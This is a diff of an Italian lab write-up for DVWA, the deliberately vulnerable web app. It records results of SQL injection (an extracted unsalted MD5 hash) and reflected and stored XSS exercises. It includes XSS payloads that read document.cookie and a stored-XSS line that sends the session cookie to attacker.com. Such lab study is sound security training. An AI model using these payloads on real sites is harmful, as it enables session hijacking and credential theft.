-**Cosa verificare**: vedi username + hash MD5 di tutti gli utenti DVWA. Cerca `5f4dcc3b5aa765d61d8327deb882cf99` online → "password". Hash senza salt = A2 (Cryptographic Failures).
+**Cosa verificare**: username + hash MD5 di tutti gli utenti DVWA estratti. `5f4dcc3b5aa765d61d8327deb882cf99` cercato online → "password". Hash senza salt = A2 (Cryptographic Failures).
 
 ---
 
@@ -424,7 +664,7 @@ Surname: 5f4dcc3b5aa765d61d8327deb882cf99
 - `<script>alert(document.cookie)</script>` — `document.cookie` è una proprietà del DOM che contiene tutti i cookie del dominio corrente, incluso il PHPSESSID. Se appare il cookie nel popup, un attaccante potrebbe esfiltrarla inviandola al suo server invece di chiamare `alert()`.
 - In attacco reale la URL sarebbe: `?name=<script>alert(document.cookie)</script>` — la vittima (già loggata su DVWA) viene portata a cliccare questa URL; il suo browser autentico esegue il codice JS nel contesto di DVWA, che ha accesso al suo PHPSESSID.
 
-**Output atteso**: appare un popup con il testo "XSS" (primo payload) o il valore del PHPSESSID (secondo payload).
+**Output ottenuto**: popup con testo "XSS" (primo payload) e popup con il PHPSESSID attivo (secondo payload). ✅
 
 **Cosa verificare**: il popup appare — XSS confermato. Il sito non fa HTML-encoding dell'input prima di echeggiarlo nella risposta.
 
@@ -455,7 +695,7 @@ Per mostrare il cookie di sessione a ogni visitatore:
 - **Differenza critica con Reflected**: nel Reflected il payload è nell'URL e richiede social engineering per far cliccare la vittima; nello Stored è nel DB e colpisce automaticamente tutti i visitatori successivi — zero interazione.
 - In un attacco reale il payload esiltra il cookie su un server dell'attaccante: `<script>document.location='http://attacker.com/steal?c='+document.cookie</script>`.
 
-**Output atteso**: il popup appare al submit; **ricaricando la pagina senza fare nulla, il popup riappare** — il payload è permanente nel DB.
+**Output ottenuto**: popup al submit; ricaricando la pagina il popup riappare senza reinserire nulla — payload persistente nel DB. ✅
 
 **Cosa verificare**: ricarica la pagina → il popup riappare. Questo dimostra la persistenza: chiunque carichi questa pagina esegue il JS.
 
